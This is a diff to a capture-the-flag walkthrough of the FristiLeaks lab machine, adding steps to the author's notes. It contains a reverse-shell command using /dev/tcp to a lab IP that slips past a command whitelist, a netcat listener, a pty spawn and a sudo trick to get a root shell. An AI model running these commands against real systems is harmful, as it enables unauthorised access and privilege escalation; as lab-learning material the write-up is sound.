@@ -251,7 +251,13 @@ Well, Jerry did say that he only allow commands from /usr/bin/ or /home/admin/. 
 /usr/bin/dir && /bin/bash -i >& /dev/tcp/192.168.0.107/6666 0>&1
 ```
 
-And we got the reverse shell.
+Start `netcat` to listen at port 6666.
+
+```
+$ nc -lvp 6666
+```
+
+Wait a minute for the connection, and we got the reverse shell.
 
 ### Admin
 
@@ -327,6 +333,12 @@ LetThereBeFristi!
 ```
 
 I thought that it was the root's password because of the name of the file, but it doesn't seem to be it. But I checked the file once again and see that it belongs to the user fristigod. I can su to fristigod now.
+
+But before that, I must spawn a tty.
+
+```
+$ python -c 'import pty;pty.spawn("/bin/bash")'
+```
 
 ### Fristigod
 
@@ -461,6 +473,12 @@ Flag: Y0u_kn0w_y0u_l0ve_fr1st1
 
 
 
+```
+
+By the way, I could just spawn a root shell with `doCom` instead of doing things one by one like that.
+
+```
+$ sudo -u fristi ./doCom /bin/bash
 ```
 
 I wonder if I managed to finish it in 4 hours. I did it in three days, around one or two hours per day. But well, it's finished though.
